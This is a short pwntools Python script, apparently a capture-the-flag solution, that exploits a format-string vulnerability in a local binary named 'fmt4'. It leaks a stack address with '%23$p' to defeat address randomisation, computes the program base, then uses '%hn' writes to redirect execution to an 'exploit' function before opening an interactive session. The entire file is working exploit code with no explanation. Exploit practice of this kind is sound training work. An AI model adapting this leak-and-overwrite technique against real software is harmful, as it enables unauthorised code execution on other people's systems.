from pwn import *

p = process("./fmt4")
e = ELF('./fmt4')

payload = b'%30x%7$hhn'
payload += b'A'
payload += b'%23$p'

p.sendlineafter(b'name: ', b'abc')
p.sendlineafter(b'flag\n', payload)
p.recvuntil(b'A' + b'0x')
main_address = int(p.recvuntil(b'\n').decode()[:-1], 16) - 106
e.address = main_address - e.symbols['main']

payload = '%{}x'.format((e.symbols['exploit'] + 0x5e) & 0xffff).encode() + b'%7$hn'
p.sendlineafter(b'flag\n', payload)
p.interactive()